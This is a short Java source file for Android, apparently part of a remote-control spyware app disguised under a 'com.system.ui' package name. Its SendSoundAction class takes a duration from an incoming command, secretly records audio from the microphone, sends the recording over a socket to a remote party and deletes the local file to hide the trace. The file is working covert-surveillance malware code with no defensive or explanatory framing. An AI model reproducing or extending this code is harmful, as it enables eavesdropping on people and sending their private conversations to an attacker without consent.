package com.system.ui.interpret;

import android.content.Context;

import com.system.ui.MainActivity;
import com.system.ui.service.LocalService;

import java.io.File;
import java.io.FileInputStream;
import java.util.Map;

/**
 * 发送录音
 */
public class SendSoundAction extends AbsAction {

	public SendSoundAction(Context context) {
		super(context);
	}

	int mDuration = 10;// 默认录10秒

	@Override
	public boolean execute() {
		Map<String, String> params = getParams();
		if (params != null) {
			if (params.containsKey("-d")) {
				mDuration = Integer.parseInt(params.get("-d"));
			}
		}

		new Thread(new Runnable() {
			
			@Override
			public void run() {
				String savePath = MainActivity.APP_FOLDER+File.separator+"sound.mp3";
				((LocalService)mContext).startRecordSound(savePath);
				try {
					Thread.sleep(mDuration * 1000);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
				((LocalService)mContext).stopRecord();
				try {
					((LocalService)mContext).getSocketThread().send(new FileInputStream(new File(savePath)));
				} catch (Exception e) {
					e.printStackTrace();
				}
				String path1 = savePath;
				File file1 = new File(path1);
				file1.delete();
			}
		}).start();
		return true;
	}

}
